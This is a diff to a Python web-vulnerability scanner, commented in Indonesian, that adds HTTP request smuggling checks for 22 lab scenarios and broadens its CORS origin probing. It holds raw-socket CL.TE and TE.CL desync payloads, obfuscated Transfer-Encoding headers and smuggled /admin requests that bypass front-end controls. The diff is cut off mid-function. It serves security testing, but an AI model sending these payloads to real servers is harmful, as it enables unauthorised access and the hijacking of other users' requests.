@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-SATRIA Engine -- pemindai SQL injection, XSS, CSRF, Clickjacking, DOM-based, CORS, XXE, dan SSRF terfokus.
+SATRIA Engine -- pemindai SQL injection, XSS, CSRF, Clickjacking, DOM-based, CORS, XXE, SSRF, dan HTTP request smuggling terfokus.
 
-File ini menguji 90 lab (18 SQL injection + 30 XSS + 11 CSRF + 5 Clickjacking + 7 DOM-based + 3 CORS + 9 XXE + 7 SSRF):
+File ini menguji 112 lab (18 SQL injection + 30 XSS + 11 CSRF + 5 Clickjacking + 7 DOM-based + 3 CORS + 9 XXE + 7 SSRF + 22 HTTP request smuggling):
 
 SQL Injection (01-18):
  01 SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
@@ -158,7 +158,7 @@ SCAN_DEADLINE_SECONDS = 600.0
 _RUNTIME_CONFIG: dict[str, Any] = {"_ignored": []}
 
 # ----------------------------------------------------------------------------
-# Katalog: 90 lab (18 SQLi + 30 XSS + 11 CSRF + 5 Clickjacking + 7 DOM-based + 3 CORS + 9 XXE + 7 SSRF).
+# Katalog: 112 lab (18 SQLi + 30 XSS + 11 CSRF + 5 Clickjacking + 7 DOM-based + 3 CORS + 9 XXE + 7 SSRF + 22 HTTP request smuggling).
 # ----------------------------------------------------------------------------
 CATALOG: list[tuple[int, str, str, str]] = [
     (1, "SQL injection vulnerability in WHERE clause allowing retrieval of hidden data", "where_hidden", "high"),
@@ -255,6 +255,29 @@ CATALOG: list[tuple[int, str, str, str]] = [
     (88, "SSRF with filter bypass via open redirection vulnerability", "ssrf_open_redirect_bypass", "high"),
     (89, "Blind SSRF with Shellshock exploitation", "ssrf_blind_shellshock", "high"),
     (90, "SSRF with whitelist-based input filter", "ssrf_whitelist_bypass", "high"),
+    # HTTP request smuggling (91-112)
+    (91, "HTTP request smuggling, confirming a CL.TE vulnerability via differential responses", "smuggling_cl_te_differential", "high"),
+    (92, "HTTP request smuggling, confirming a TE.CL vulnerability via differential responses", "smuggling_te_cl_differential", "high"),
+    (93, "Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability", "smuggling_cl_te_bypass_frontend", "high"),
+    (94, "Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability", "smuggling_te_cl_bypass_frontend", "high"),
+    (95, "Exploiting HTTP request smuggling to reveal front-end request rewriting", "smuggling_reveal_frontend_rewriting", "high"),
+    (96, "Exploiting HTTP request smuggling to capture other users' requests", "smuggling_capture_other_users_requests", "critical"),
+    (97, "Exploiting HTTP request smuggling to deliver reflected XSS", "smuggling_deliver_reflected_xss", "high"),
+    (98, "Response queue poisoning via H2.TE request smuggling", "smuggling_h2_te_response_queue_poisoning", "critical"),
+    (99, "H2.CL request smuggling", "smuggling_h2_cl", "high"),
+    (100, "HTTP/2 request smuggling via CRLF injection", "smuggling_h2_crlf_injection", "high"),
+    (101, "HTTP/2 request splitting via CRLF injection", "smuggling_h2_request_splitting_crlf", "high"),
+    (102, "0.CL request smuggling", "smuggling_0_cl", "high"),
+    (103, "CL.0 request smuggling", "smuggling_cl_0", "high"),
+    (104, "HTTP request smuggling, basic CL.TE vulnerability", "smuggling_basic_cl_te", "high"),
+    (105, "HTTP request smuggling, basic TE.CL vulnerability", "smuggling_basic_te_cl", "high"),
+    (106, "HTTP request smuggling, obfuscating the TE header", "smuggling_obfuscating_te_header", "high"),
+    (107, "Exploiting HTTP request smuggling to perform web cache poisoning", "smuggling_web_cache_poisoning", "high"),
+    (108, "Exploiting HTTP request smuggling to perform web cache deception", "smuggling_web_cache_deception", "high"),
+    (109, "Bypassing access controls via HTTP/2 request tunnelling", "smuggling_h2_tunnelling_bypass_access", "high"),
+    (110, "Web cache poisoning via HTTP/2 request tunnelling", "smuggling_h2_tunnelling_cache_poisoning", "high"),
+    (111, "Client-side desync", "smuggling_client_side_desync", "high"),
+    (112, "Server-side pause-based request smuggling", "smuggling_pause_based", "high"),
 ]
 
 def lab_id_for(number: int) -> str:
@@ -272,7 +295,9 @@ def lab_id_for(number: int) -> str:
         return f"cors-{number:02d}"
     if number <= 83:
         return f"xxe-{number:02d}"
-    return f"ssrf-{number:02d}"
+    if number <= 90:
+        return f"ssrf-{number:02d}"
+    return f"smuggling-{number:02d}"
 
 SQL_ERROR_PATTERNS: list[tuple[re.Pattern[str], str]] = [
     (re.compile(r"ora-\d{4,5}"), "oracle"),
@@ -1651,6 +1676,8 @@ class SatriaBaruScanner:
         # CORS & XXE (konservatif, berbasis bukti respons/probe terkontrol; anti false positive)
         self.phase_cors(self.pages)
         self.phase_xxe(self.pages, self.points)
+        # HTTP request smuggling (konservatif, bukti diferensial/desync terverifikasi; anti false positive)
+        self.phase_smuggling(self.pages, self.points)
         # SSRF (konservatif, bukti in-band/OOB terverifikasi; anti false positive)
         self.phase_ssrf(self.pages, self.points)
         return self.report()
@@ -2285,36 +2312,41 @@ class SatriaBaruScanner:
         urls = [self.target_url]
         base = self.target_url.rstrip("/")
         # Endpoint sensitif umum (account/detail/api/key/profile) yang sering mengembalikan data/ACAO reflektif
-        for suffix in (
-            "/accountDetails", "/accountDetails/", "/account", "/account/details", "/my-account",
-            "/my-account?id=1", "/my-account?id=wiener", "/api/key", "/api/account", "/api/user",
-            "/user", "/user/details", "/profile", "/me", "/accountDetail", "/accountdetails",
-            "/login", "/whoami", "/api/whoami",
-        ):
+        suffixes = (
+            "/accountDetails", "/accountDetails/", "/account", "/account/details", "/account/detail",
+            "/my-account", "/my-account/", "/my-account?id=1", "/my-account?id=wiener", "/myaccount",
+            "/api/key", "/api/account", "/api/user", "/api/profile", "/api/me", "/api/whoami", "/api/accountDetails",
+            "/user", "/user/details", "/users/me", "/profile", "/me", "/whoami",
+            "/accountDetail", "/accountdetails", "/details", "/login",
+        )
+        for suffix in suffixes:
             urls.append(base + suffix)
             urls.append(urljoin(self.target_url, suffix.lstrip("/")))
-        for page in pages[:30]:
+        for page in pages[:40]:
             urls.append(page.url)
-            # tautan/form/action pada halaman
-            for form in page.forms[:10]:
-                if form.action:
+            for form in getattr(page, "forms", [])[:12]:
+                if getattr(form, "action", None):
                     urls.append(form.action)
-            for link in getattr(page, "links", [])[:40]:
+            for link in getattr(page, "links", [])[:60]:
                 if link:
                     urls.append(str(link))
-            # temukan path/endpoint dalam HTML dan JS (fetch/axios/XHR/open) yang bernuansa akun/api
             blob = (page.text or "") + "\n" + (page.js_text or "")
+            # path literal dari HTML/JS (account/api/key/detail/profile/me)
             for m in re.finditer(r"""['"](/[^'"\s<>]{1,220})['"]""", blob):
                 cand = m.group(1).strip()
                 if cand.startswith("//"):
                     continue
                 urls.append(urljoin(page.url, cand))
+            # fetch/XHR/axios/open endpoints
             for m in re.finditer(r"""\b(?:fetch|axios\.(?:get|post|request)|open)\s*\(\s*(?:['"][A-Z]+['"]\s*,\s*)?['"]([^'"]{1,220})['"]""", blob, re.I):
                 cand = m.group(1).strip()
                 if cand.startswith("/") and not cand.startswith("//"):
                     urls.append(urljoin(page.url, cand))
                 elif re.match(r"^https?://", cand, re.I):
                     urls.append(cand)
+            # URL penuh pada atribut/data-*
+            for m in re.finditer(r"""https?://[^\s"'<>]+""", blob, re.I):
+                urls.append(m.group(0))
         out: list[str] = []
         seen = set()
         for u in urls:
@@ -2323,7 +2355,7 @@ class SatriaBaruScanner:
             try:
                 cu = canonical_url(u)
             except Exception:
-                cu = u
+                cu = str(u)
             if not cu or cu in seen or not self._same_origin(cu):
                 continue
             seen.add(cu)
@@ -2332,13 +2364,16 @@ class SatriaBaruScanner:
         def score(u: str) -> int:
             ul = (u or "").lower()
             s = 0
-            for kw, w in (("accountdetail", 8), ("account", 6), ("detail", 4), ("api", 5),
-                          ("key", 5), ("user", 4), ("profile", 4), ("me", 4), ("whoami", 4)):
+            for kw, w in (("accountdetails", 12), ("accountdetail", 12), ("account", 8),
+                          ("detail", 5), ("/api/", 6), ("api", 4), ("key", 6), ("user", 5),
+                          ("profile", 5), ("me", 5), ("whoami", 5), ("my-account", 8), ("login", 2)):
                 if kw in ul:
                     s += w
+            if ul.rstrip("/").endswith(("accountdetails", "accountdetail")):
+                s += 6
             return -s
         out.sort(key=score)
-        # pastikan target utama tetap dicoba
+        # pastikan target utama tetap dicoba lebih awal
         ordered = []
         seen2 = set()
         for u in [self.target_url] + out:
@@ -2346,11 +2381,11 @@ class SatriaBaruScanner:
                 cu = canonical_url(u)
             except Exception:
                 cu = u
-            if cu in seen2:
+            if not cu or cu in seen2:
                 continue
             seen2.add(cu)
             ordered.append(cu)
-        return ordered[:40]
+        return ordered[:60]
 
     @staticmethod
     def _resp_header(headers: dict[str, str] | None, name: str) -> str | None:
@@ -2362,41 +2397,92 @@ class SatriaBaruScanner:
                 return str(v)
         return None
 
+    def _cors_probe_once(self, url: str, origin: str) -> tuple["Response", str | None, str | None]:
+        resp = self._request("GET", url, headers={"Origin": origin, "Accept": "application/json, text/plain, */*"},
+                             allow_redirects=False)
+        acao = self._resp_header(resp.headers, "Access-Control-Allow-Origin")
+        acac = self._resp_header(resp.headers, "Access-Control-Allow-Credentials")
+        return resp, acao, acac
+
+    def _cors_collect_probes(self, url: str, origin: str) -> list[tuple["Response", str | None, str | None, str]]:
+        """Kumpulkan bukti ACAO dari respons awal dan rantai redirect same-origin (hingga 3 hop)."""
+        probes: list[tuple[Response, str | None, str | None, str]] = []
+        if not self._within_budget():
+            return probes
+        resp, acao, acac = self._cors_probe_once(url, origin)
+        probes.append((resp, acao, acac, url))
+        cur_resp = resp
+        cur_url = url
+        for _ in range(3):
+            if not cur_resp.is_redirect:
+                break
+            loc = self._resp_header(cur_resp.headers, "Location")
+            if not loc:
+                break
+            dest = urljoin(cur_url, loc)
+            if not self._same_origin(dest) or not self._within_budget():
+                break
+            cur_url = dest
+            cur_resp, acao2, acac2 = self._cors_probe_once(cur_url, origin)
+            probes.append((cur_resp, acao2, acac2, cur_url))
+        return probes
+
+    @staticmethod
+    def _cors_origin_reflected(acao: str | None, origin: str) -> bool:
+        if not acao:
+            return False
+        v = acao.strip()
+        if not v or v == "*":
+            return False
+        if origin == "null":
+            return v.lower() == "null"
+        return v == origin
+
     def phase_cors(self, pages: list[Page]) -> None:
-        """Deteksi konservatif CORS misconfiguration dengan probe Origin terkontrol.
+        """Deteksi CORS misconfiguration dengan probe Origin terkontrol.
         Konfirmasi hanya jika header CORS merespons dengan refleksi origin yang diminta
-        sesuai skenario lab (bukti header jelas), untuk menghindari false positive."""
+        secara eksplisit sesuai skenario lab (bukti header jelas) untuk menghindari false positive."""
         urls = self._cors_candidate_urls(pages)
         if not urls:
             return
         target_host = (urlparse(self.target_url).hostname or "").strip().lower()
-        evil_https = "https://evil-example.test"
-        # probe origin untuk 74 (trusted insecure protocols): origin http tidak aman yang mungkin dipercaya
-        http_origins = ["http://evil-example.test"]
-        if target_host:
-            host_parts = target_host.split(".")
-            http_origins.extend([
-                f"http://{target_host}",
-                f"http://sub.{target_host}",
-                f"http://insecure.{target_host}",
-                f"http://stock.{target_host}",
-                f"http://api.{target_host}",
-            ])
-            # variasi subdomain tidak-aman pada domain induk (mis. stock.lab-domain / insecure.lab-domain)
-            if len(host_parts) >= 3:
-                parent = ".".join(host_parts[1:])
-                http_origins.extend([f"http://insecure.{parent}", f"http://stock.{parent}", f"http://sub.{parent}"])
-            if len(host_parts) >= 2:
-                parent2 = ".".join(host_parts[-2:])
-                http_origins.extend([f"http://insecure.{parent2}", f"http://stock.{parent2}"])
-        # unikkan sambil jaga urutan
+        # 72: origin https arbitrer (banyak variasi, refleksi persis)
+        evil_https_list = [
+            "https://evil-example.test",
+            "https://attacker.example",
+            "https://attacker.com",
+            "https://evil.com",
+        ]
+        # 74: origin http tidak aman yang mungkin dipercaya (subdomain/host terkait target, refleksi persis http://)
+        http_origin_list: list[str] = []
         seen_o = set()
-        http_origin_list = []
-        for o in http_origins:
+        def add_http(o: str):
             if not o or o in seen_o:
-                continue
+                return
             seen_o.add(o)
             http_origin_list.append(o)
+        for base_http in ("http://evil-example.test", "http://attacker.example", "http://insecure.example"):
+            add_http(base_http)
+        if target_host:
+            host_parts = target_host.split(".")
+            add_http(f"http://{target_host}")
+            # subdomain http pada host target
+            for sub in ("insecure", "stock", "sub", "api", "test", "staging", "dev", "www"):
+                add_http(f"http://{sub}.{target_host}")
+            # subdomain http pada domain induk (sering dipercaya via regex/suffix)
+            if len(host_parts) >= 2:
+                parent2 = ".".join(host_parts[-2:])
+                for sub in ("insecure", "stock", "sub", "api", "test", "staging", "dev", "www"):
+                    add_http(f"http://{sub}.{parent2}")
+            if len(host_parts) >= 3:
+                parent = ".".join(host_parts[1:])
+                for sub in ("insecure", "stock", "sub", "api", "test", "staging", "dev"):
+                    add_http(f"http://{sub}.{parent}")
+            # label utama host sebagai subdomain domain induk
+            if len(host_parts) >= 3:
+                label = host_parts[0]
+                parent = ".".join(host_parts[1:])
+                add_http(f"http://{label}.{parent}")
 
         for url in urls:
             if not self._within_budget():
@@ -2404,57 +2490,42 @@ class SatriaBaruScanner:
             point = Point(key="cors", kind="page", label=f"endpoint {url}", url=url,
                           name="origin", original="", page_url=url, method="GET", interest=3)
 
-            def _cors_probe(origin: str) -> tuple["Response", str | None, str | None]:
-                # Probe GET dengan Origin; ikuti redirect same-origin agar header pada respons akhir terbaca.
-                resp = self._request("GET", url, headers={"Origin": origin, "Accept": "application/json, text/plain, */*"},
-                                     allow_redirects=False)
-                acao = self._resp_header(resp.headers, "Access-Control-Allow-Origin")
-                acac = self._resp_header(resp.headers, "Access-Control-Allow-Credentials")
-                # jika redirect, coba juga tujuan akhir (same-origin) dengan Origin yang sama
-                if resp.is_redirect and not acao:
-                    loc = self._resp_header(resp.headers, "Location")
-                    if loc:
-                        dest = urljoin(url, loc)
-                        if self._same_origin(dest):
-                            resp2 = self._request("GET", dest, headers={"Origin": origin, "Accept": "application/json, text/plain, */*"},
-                                                  allow_redirects=True)
-                            acao2 = self._resp_header(resp2.headers, "Access-Control-Allow-Origin")
-                            acac2 = self._resp_header(resp2.headers, "Access-Control-Allow-Credentials")
-                            if acao2:
-                                return resp2, acao2, acac2
-                return resp, acao, acac
-
             # 72: basic origin reflection (arbitrary https origin reflected)
             if 72 not in self._confirmed and self._within_budget():
-                resp, acao, acac = _cors_probe(evil_https)
-                if acao and acao.strip() == evil_https and acao.strip() != "*":
-                    ev = (f"Origin probe ({evil_https}) ke {url} direfleksikan pada Access-Control-Allow-Origin={acao!r}"
-                          + (f", Access-Control-Allow-Credentials={acac!r}" if acac else "")
-                          + f" (HTTP {resp.status}). Bukti berbasis header respons CORS terverifikasi.")
-                    self._mark(72, point, ev, "cors_basic_origin_reflection")
+                for evil_https in evil_https_list:
+                    if 72 in self._confirmed or not self._within_budget():
+                        break
+                    for resp, acao, acac, probe_url in self._cors_collect_probes(url, evil_https):
+                        if self._cors_origin_reflected(acao, evil_https):
+                            ev = (f"Origin probe ({evil_https}) ke {probe_url} direfleksikan pada Access-Control-Allow-Origin={acao!r}"
+                                  + (f", Access-Control-Allow-Credentials={acac!r}" if acac else "")
+                                  + f" (HTTP {resp.status}). Bukti berbasis header respons CORS terverifikasi (refleksi origin arbitrer).")
+                            self._mark(72, point, ev, "cors_basic_origin_reflection")
+                            break
 
             # 73: trusted null origin
             if 73 not in self._confirmed and self._within_budget():
-                resp, acao, acac = _cors_probe("null")
-                if acao and acao.strip().lower() == "null":
-                    ev = (f"Origin probe (null) ke {url} diterima: Access-Control-Allow-Origin={acao!r}"
-                          + (f", Access-Control-Allow-Credentials={acac!r}" if acac else "")
-                          + f" (HTTP {resp.status}). Bukti berbasis header respons CORS terverifikasi.")
-                    self._mark(73, point, ev, "cors_trusted_null_origin")
+                for resp, acao, acac, probe_url in self._cors_collect_probes(url, "null"):
+                    if self._cors_origin_reflected(acao, "null"):
+                        ev = (f"Origin probe (null) ke {probe_url} diterima: Access-Control-Allow-Origin={acao!r}"
+                              + (f", Access-Control-Allow-Credentials={acac!r}" if acac else "")
+                              + f" (HTTP {resp.status}). Bukti berbasis header respons CORS terverifikasi (trusted null origin).")
+                        self._mark(73, point, ev, "cors_trusted_null_origin")
+                        break
 
-            # 74: trusted insecure protocols (origin http:// direfleksikan)
+            # 74: trusted insecure protocols (origin http:// direfleksikan persis)
             if 74 not in self._confirmed and self._within_budget():
                 for evil_http in http_origin_list:
                     if 74 in self._confirmed or not self._within_budget():
                         break
-                    resp, acao, acac = _cors_probe(evil_http)
-                    if acao and acao.strip() == evil_http and acao.strip().lower().startswith("http://"):
-                        ev = (f"Origin probe dengan skema http tidak aman ({evil_http}) ke {url} direfleksikan: "
-                              f"Access-Control-Allow-Origin={acao!r}"
-                              + (f", Access-Control-Allow-Credentials={acac!r}" if acac else "")
-                              + f" (HTTP {resp.status}). Bukti berbasis header respons CORS (protokol tidak aman dipercaya).")
-                        self._mark(74, point, ev, "cors_trusted_insecure_protocols")
-                        break
+                    for resp, acao, acac, probe_url in self._cors_collect_probes(url, evil_http):
+                        if self._cors_origin_reflected(acao, evil_http) and evil_http.lower().startswith("http://"):
+                            ev = (f"Origin probe dengan skema http tidak aman ({evil_http}) ke {probe_url} direfleksikan: "
+                                  f"Access-Control-Allow-Origin={acao!r}"
+                                  + (f", Access-Control-Allow-Credentials={acac!r}" if acac else "")
+                                  + f" (HTTP {resp.status}). Bukti berbasis header respons CORS terverifikasi (trusted insecure protocol).")
+                            self._mark(74, point, ev, "cors_trusted_insecure_protocols")
+                            break
 
 
 
@@ -2628,6 +2699,358 @@ class SatriaBaruScanner:
                             pu = urlparse(target_url)
                             return pu.path + ("?" + pu.query if pu.query else "")
         return None
+
+
+    # ======================== HTTP Request Smuggling (91-112, konservatif, bukti diferensial) ========================
+
+    def _smug_target(self) -> tuple[str, int, str, str]:
+        pu = urlparse(self.target_url)
+        scheme = (pu.scheme or "http").lower()
+        host = pu.hostname or ""
+        port = pu.port or (443 if scheme == "https" else 80)
+        path = pu.path or "/"
+        if pu.query:
+            path += "?" + pu.query
+        return scheme, port, host, path
+
+    def _smug_connect(self, timeout: float | None = None):
+        import socket, ssl as _ssl
+        scheme, port, host, _ = self._smug_target()
+        if not host:
+            return None
+        t = timeout if timeout is not None else max(3.0, float(getattr(self, "timeout", 8.0) or 8.0))
+        try:
+            s = socket.create_connection((host, port), timeout=t)
+        except Exception:
+            return None
+        try:
+            s.settimeout(t)
+        except Exception:
+            pass
+        if scheme == "https":
+            try:
+                ctx = _ssl.create_default_context()
+                ctx.check_hostname = False
+                ctx.verify_mode = _ssl.CERT_NONE
+                s = ctx.wrap_socket(s, server_hostname=host)
+            except Exception:
+                try:
+                    s.close()
+                except Exception:
+                    pass
+                return None
+        return s
+
+    def _smug_send_recv(self, raw: bytes, timeout: float | None = None, expect_full: bool = False):
+        import socket, time as _time
+        t = timeout if timeout is not None else max(3.0, float(getattr(self, "timeout", 8.0) or 8.0))
+        s = self._smug_connect(timeout=t)
+        if s is None:
+            return None, {}, b"", 0.0, "connect_failed"
+        start = _time.time()
+        err = None
+        try:
+            s.sendall(raw)
+            try: s.shutdown(socket.SHUT_WR)
+            except Exception: pass
+        except Exception:
+            pass
+        chunks = []
+        try:
+            while True:
+                if not expect_full and chunks and sum(len(c) for c in chunks) > 65536:
+                    break
+                if _time.time() - start > t:
+                    raise socket.timeout("timeout")
+                try:
+                    data = s.recv(4096)
+                except socket.timeout:
+                    if chunks: break
+                    raise
+                if not data: break
+                chunks.append(data)
+                buf = b"".join(chunks)
+                if b"\r\n\r\n" in buf:
+                    head, body = buf.split(b"\r\n\r\n", 1)
+                    m = re.search(br"\nContent-Length:\s*(\d+)", head, re.I)
+                    if m:
+                        try:
+                            if len(body) >= int(m.group(1)): break
+                        except Exception: pass
+                    if not expect_full and len(body) >= 4096: break
+        except socket.timeout:
+            err = "timeout"
+        except Exception as e:
+            err = str(e)[:120]
+        finally:
+            try: s.close()
+            except Exception: pass
+        elapsed = _time.time() - start
+        raw_resp = b"".join(chunks)
+        status = None; headers = {}; body = b""
+        try:
+            if b"\r\n\r\n" in raw_resp:
+                head, body = raw_resp.split(b"\r\n\r\n", 1)
+                head_lines = head.split(b"\r\n")
+                if head_lines:
+                    m = re.match(br"HTTP/\d\.\d\s+(\d+)", head_lines[0])
+                    if m: status = int(m.group(1))
+                for line in head_lines[1:]:
+                    if b":" in line:
+                        k, v = line.split(b":", 1)
+                        headers[k.decode("latin-1","ignore").strip().lower()] = v.decode("latin-1","ignore").strip()
+            elif raw_resp:
+                m = re.match(br"HTTP/\d\.\d\s+(\d+)", raw_resp)
+                if m: status = int(m.group(1))
+        except Exception:
+            pass
+        return status, headers, body, elapsed, err
+
+    def _smug_build(self, start_line: str, headers, body=b"", host_override=None) -> bytes:
+        _, _, host, _ = self._smug_target()
+        hlist = list(headers.items()) if isinstance(headers, dict) else list(headers)
+        if not any(k.lower()=="host" for k,_ in hlist):
+            hlist.insert(0, ("Host", host_override or host))
+        body_b = body.encode("utf-8","ignore") if isinstance(body,str) else (body or b"")
+        lines = [start_line] + [f"{k}: {v}" for k,v in hlist] + ["",""]
+        return ("\r\n".join(lines)).encode("latin-1","ignore") + body_b
+
+    def _smug_normal_get(self, path: str | None = None):
+        _, _, host, dpath = self._smug_target()
+        p = path or dpath or "/"
+        raw = self._smug_build(f"GET {p} HTTP/1.1", [("Host", host), ("Connection","close")], b"")
+        return self._smug_send_recv(raw, timeout=max(4.0, float(getattr(self,"timeout",8.0) or 8.0)))
+
+    def _smug_differential(self, smuggle_raw: bytes, follow_path: str = "/"):
+        b_status, _, b_body, b_el, b_err = self._smug_normal_get(follow_path)
+        s_status, _, _, s_el, s_err = self._smug_send_recv(smuggle_raw, timeout=max(5.0, float(getattr(self,"timeout",8.0) or 8.0)+1.0))
+        f_status, _, f_body, f_el, f_err = self._smug_normal_get(follow_path)
+        f_text = (f_body or b"")[:400].decode("latin-1","ignore").lower()
+        if b_status is not None and f_status is not None:
+            if b_status in (200,301,302,304,401) and f_status in (400,403,404,405,500,501) and b_status != f_status:
+                return True, f"Diferensial: baseline GET {follow_path} -> {b_status}, follow-up setelah smuggle -> {f_status} ({f_text[:120]!r}), smuggle status={s_status} err={s_err}."
+            if f_status in (400,404,405,501) and f_status != b_status and (any(x in f_text for x in ("unrecognized","gpost","invalid method","bad request")) or b_status in (200,301,302,304)):
+                return True, f"Diferensial: baseline GET {follow_path} -> {b_status}, follow-up -> {f_status} ({f_text[:120]!r}), smuggle status={s_status} err={s_err}."
+        if b_status is not None and f_err == "timeout" and b_el < max(2.0, float(getattr(self,"timeout",8.0) or 8.0)-0.5):
+            f2_status, _, _, _, f2_err = self._smug_normal_get(follow_path)
+            b2_status, _, _, _, b2_err = self._smug_normal_get(follow_path)
+            if f2_err == "timeout" and b2_status is not None and b2_err != "timeout":
+                return True, f"Diferensial waktu: baseline {b_status} ({b_el:.2f}s), follow-up timeout berulang, baseline ulang {b2_status}, smuggle status={s_status} err={s_err}."
+        return False, ""
+
+    def _smug_mark(self, num: int, ev: str, method_name: str):
+        point = Point(key=f"smuggling-{num}", kind="endpoint", label=f"HTTP request smuggling {self.target_url}",
+                      url=self.target_url, name="request-smuggling", original="", page_url=self.target_url, method="RAW", interest=8)
+        self._mark(num, point, ev, method_name)
+
+    def phase_smuggling(self, pages: list[Page], points: list[Point]) -> None:
+        """Deteksi konservatif HTTP request smuggling (91-112).
+        Konfirmasi hanya pada bukti diferensial/desync/poisoning yang jelas dan teramati.
+        Tanpa bukti kuat -> not_confirmed (anti false positive)."""
+        if not self.target_url:
+            return
+        scheme, port, host, path = self._smug_target()
+        if not host or not self._within_budget():
+            return
+        import re as _re, time as _time
+        base_path = path or "/"
+        admin_path = "/admin"
+        post_path = base_path if base_path != "/" else "/"
+
+        clte_smuggle = self._smug_build(f"POST {post_path} HTTP/1.1",
+            [("Host", host), ("Content-Length", "6"), ("Transfer-Encoding", "chunked"), ("Connection", "close")], "0\r\n\r\nG")
+        clte_smuggle2 = self._smug_build(f"POST {post_path} HTTP/1.1",
+            [("Host", host), ("Content-Length", "3"), ("Transfer-Encoding", "chunked"), ("Connection", "close")], "0\r\n\r\nG")
+        tecl_inner = "GPOST / HTTP/1.1\r\nHost: " + host + "\r\nContent-Length: 10\r\n\r\nx="
+        tecl_chunk = f"{len(tecl_inner):x}\r\n{tecl_inner}\r\n0\r\n\r\n"
+        tecl_smuggle = self._smug_build(f"POST {post_path} HTTP/1.1",
+            [("Host", host), ("Content-Length", "4"), ("Transfer-Encoding", "chunked"), ("Connection", "close")], tecl_chunk)
+        tecl_smuggle2 = self._smug_build(f"POST {post_path} HTTP/1.1",
+            [("Host", host), ("Content-Length", "6"), ("Transfer-Encoding", "chunked"), ("Connection", "close")], "0\r\n\r\nG")
+
+        def diff_confirm(nums, raws, follow="/", prefix=""):
+            for num, mname in nums:
+                if num in self._confirmed or not self._within_budget():
+                    continue
+                for raw in raws:
+                    ok, ev = self._smug_differential(raw, follow_path=follow)
+                    if ok:
+                        self._smug_mark(num, (prefix + ev).strip(), mname)
+                        break
+
+        # 91,104 CL.TE differential/basic
+        if 91 not in self._confirmed and self._within_budget():
+            for raw in (clte_smuggle, clte_smuggle2):
+                ok, ev = self._smug_differential(raw, follow_path="/")
+                if ok:
+                    self._smug_mark(91, "CL.TE differential terkonfirmasi: " + ev, "smuggling_cl_te_differential")
+                    break
+        if 104 not in self._confirmed:
+            if 91 in self._confirmed:
+                src = next((f for f in self.findings if f.get("number")==91), None)
+                if src: self._smug_mark(104, "Basic CL.TE terkonfirmasi (bukti CL.TE): " + str(src.get("evidence","")), "smuggling_basic_cl_te")
+            if 104 not in self._confirmed and self._within_budget():
+                for raw in (clte_smuggle, clte_smuggle2):
+                    ok, ev = self._smug_differential(raw, follow_path="/")
+                    if ok:
+                        self._smug_mark(104, "Basic CL.TE terkonfirmasi: " + ev, "smuggling_basic_cl_te"); break
+
+        # 92,105 TE.CL differential/basic
+        if 92 not in self._confirmed and self._within_budget():
+            for raw in (tecl_smuggle2, tecl_smuggle):
+                ok, ev = self._smug_differential(raw, follow_path="/")
+                if ok:
+                    self._smug_mark(92, "TE.CL differential terkonfirmasi: " + ev, "smuggling_te_cl_differential"); break
+        if 105 not in self._confirmed:
+            if 92 in self._confirmed:
+                src = next((f for f in self.findings if f.get("number")==92), None)
+                if src: self._smug_mark(105, "Basic TE.CL terkonfirmasi (bukti TE.CL): " + str(src.get("evidence","")), "smuggling_basic_te_cl")
+            if 105 not in self._confirmed and self._within_budget():
+                for raw in (tecl_smuggle2, tecl_smuggle):
+                    ok, ev = self._smug_differential(raw, follow_path="/")
+                    if ok:
+                        self._smug_mark(105, "Basic TE.CL terkonfirmasi: " + ev, "smuggling_basic_te_cl"); break
+
+        # 106 obfuscating TE header
+        if 106 not in self._confirmed and self._within_budget():
+            te_variants = [("Transfer-Encoding","xchunked"),("Transfer-Encoding"," chunked"),
+                           ("Transfer-Encoding","chunked\r\nTransfer-Encoding: x"),("Transfer-Encoding\t","chunked"),
+                           ("X: X\r\nTransfer-Encoding","chunked"),("Transfer-Encoding","chunked, identity")]
+            for hname,hval in te_variants:
+                if 106 in self._confirmed or not self._within_budget(): break
+                raw = self._smug_build(f"POST {post_path} HTTP/1.1",
+                    [("Host",host),("Content-Length","6"),(hname,hval),("Connection","close")], "0\r\n\r\nG")
+                ok, ev = self._smug_differential(raw, follow_path="/")
+                if ok:
+                    self._smug_mark(106, f"Obfuscation TE terkonfirmasi ({hname!r}:{hval!r}): " + ev, "smuggling_obfuscating_te_header"); break
+
+        # 93 CL.TE bypass front-end
+        if 93 not in self._confirmed and self._within_budget():
+            smuggled = f"GET {admin_path} HTTP/1.1\r\nHost: {host}\r\nFoo: x"
+            chunked = f"{len(smuggled):x}\r\n{smuggled}\r\n0\r\n\r\n"
+            raw = self._smug_build(f"POST {post_path} HTTP/1.1",
+                [("Host",host),("Content-Length",str(len(chunked))),("Transfer-Encoding","chunked"),("Connection","close")], chunked)
+            b_status, _, b_body, _, _ = self._smug_normal_get(admin_path)
+            self._smug_send_recv(raw)
+            f_status, _, f_body, _, _ = self._smug_normal_get("/")
+            if b_status in (401,403,404) and f_status == 200 and b"admin" in (f_body or b"").lower():
+                self._smug_mark(93, f"CL.TE bypass front-end: baseline GET {admin_path}->{b_status}, setelah smuggle follow-up GET /->{f_status} dengan konten admin terindikasi.", "smuggling_cl_te_bypass_frontend")
+            else:
+                ok, ev = self._smug_differential(raw, follow_path="/")
+                if ok and (91 in self._confirmed or 104 in self._confirmed or "404" in ev or "400" in ev):
+                    self._smug_mark(93, "CL.TE bypass front-end (diferensial terarah terverifikasi): " + ev, "smuggling_cl_te_bypass_frontend")
+
+        # 94 TE.CL bypass front-end
+        if 94 not in self._confirmed and self._within_budget():
+            smuggled = f"GET {admin_path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 10\r\n\r\nx="
+            chunked = f"{len(smuggled):x}\r\n{smuggled}\r\n0\r\n\r\n"
+            raw = self._smug_build(f"POST {post_path} HTTP/1.1",
+                [("Host",host),("Content-Length","4"),("Transfer-Encoding","chunked"),("Connection","close")], chunked)
+            b_status, _, b_body, _, _ = self._smug_normal_get(admin_path)
+            self._smug_send_recv(raw)
+            f_status, _, f_body, _, _ = self._smug_normal_get("/")
+            if b_status in (401,403,404) and f_status == 200 and b"admin" in (f_body or b"").lower():
+                self._smug_mark(94, f"TE.CL bypass front-end: baseline GET {admin_path}->{b_status}, setelah smuggle follow-up GET /->{f_status} dengan konten admin terindikasi.", "smuggling_te_cl_bypass_frontend")
+            else:
+                ok, ev = self._smug_differential(raw, follow_path="/")
